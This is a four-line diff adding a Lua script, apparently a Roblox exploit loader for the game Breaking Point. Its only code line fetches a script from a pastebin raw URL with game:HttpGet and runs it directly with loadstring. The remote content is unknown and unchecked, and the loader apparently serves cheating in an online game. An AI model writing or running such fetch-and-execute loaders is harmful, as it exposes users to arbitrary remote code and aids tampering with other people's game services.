@@ -1,0 +1,4 @@
+--[[
+Yes this is breaking point
+--]]
+loadstring(game:HttpGet('https://pastebin.com/raw/MLPypHYv', true))()
